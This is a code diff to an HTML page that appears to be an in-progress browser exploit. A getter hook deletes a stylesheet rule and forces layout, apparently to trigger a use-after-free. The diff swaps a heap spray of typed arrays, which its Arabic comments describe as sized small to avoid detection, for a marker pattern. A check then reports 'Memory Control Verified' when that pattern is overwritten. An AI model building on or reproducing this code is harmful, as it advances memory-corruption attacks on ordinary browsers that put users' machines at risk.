@@ -6,7 +6,7 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:red; font-family:monospace;">Status: Initializing...</div>
+    <div id="debug" style="color:blue; font-family:monospace;">Status: Probing Memory...</div>
     <script>
         const debug = document.getElementById('debug');
         
@@ -20,23 +20,20 @@
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug.innerText = "Status: Hooked. Allocating surgical blocks...";
                         
-                        // تخصيص جراحي: مصفوفات صغيرة جداً وبعدد محدود
-                        let spray = [];
-                        try {
-                            for(let i=0; i<10; i++) { 
-                                // حجم صغير جداً (0x200) لتجنب كشف التخصيص الكبير
-                                spray.push(new Uint32Array(0x200).fill(0x41414141));
-                            }
-                        } catch(e) {
-                            debug.innerText = "Error: " + e.message;
-                        }
+                        // تخصيص "نمط" (Pattern)
+                        const PATTERN = 0x42424242;
+                        let spray = new Uint32Array(100).fill(PATTERN);
                         
                         document.getElementById('s').sheet.deleteRule(0);
                         document.body.offsetTop;
                         
-                        debug.innerText = "Status: Execution complete. Monitor for stability.";
+                        // التحقق: هل لا يزال النمط كما هو أم تغير؟
+                        if (spray[5] !== PATTERN) {
+                            debug.innerText = "!! SUCCESS: Memory Control Verified. Pattern changed to: " + spray[5].toString(16);
+                        } else {
+                            debug.innerText = "Status: No corruption yet. Need to refine 'Spray' timing.";
+                        }
                     }
                     return undefined;
                 }
